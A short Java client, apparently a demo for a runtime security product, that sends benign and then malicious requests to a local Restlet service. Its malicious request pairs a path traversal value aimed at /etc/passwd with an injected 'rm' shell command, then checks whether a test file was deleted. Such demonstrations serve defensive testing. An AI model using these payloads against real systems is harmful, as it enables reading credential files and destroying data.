package com.waratek.rootkit.client;

import java.io.File;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.Charset;

import org.restlet.resource.ClientResource;
import org.restlet.resource.ResourceException;

public class Client {

  public void call(String url) {
    ClientResource resource = new ClientResource(url);

    try {
      resource.get().write(System.out);
    } catch (ResourceException | IOException e) {
      e.printStackTrace();
    }
  }

  public static void main(String[] args) throws IOException {
    String url = "http://localhost:8182/contact/q?", request, nameParam = "name=", maliciousValue =
        "../../../../../etc/passwd", goodValue1 = "john", goodValue2 = "stephanie", actionParam =
        "&action=", goodAction1 = "time", fileName = "sample-to-delete", maliciousAction =
        URLEncoder.encode("rm " + fileName, Charset.defaultCharset().name());

    Client client = new Client();

    request = url + nameParam + goodValue1 + actionParam + goodAction1;
    System.out.println("\n\nGood Client request: " + request+"\nResponse:");
    client.call(request);

    request = url + nameParam + goodValue2 + actionParam + goodAction1;
    System.out.println("\n\nGood Client request: " + request+"\nResponse:");
    client.call(request);

    File file = new File(fileName);
    if (file.createNewFile() || file.exists()){
      System.out.println("\n\n\n"+file.getAbsolutePath()+" exists.");
    }
    request = url + nameParam + maliciousValue + actionParam + maliciousAction;
    System.out.println("Malicious Client request: " + request+"\nResponse:");
    client.call(request);
    if (!file.exists()){
      System.out.println("\n"+file.getAbsolutePath()+" has been removed.");
    }
    System.exit(0);
  }
}
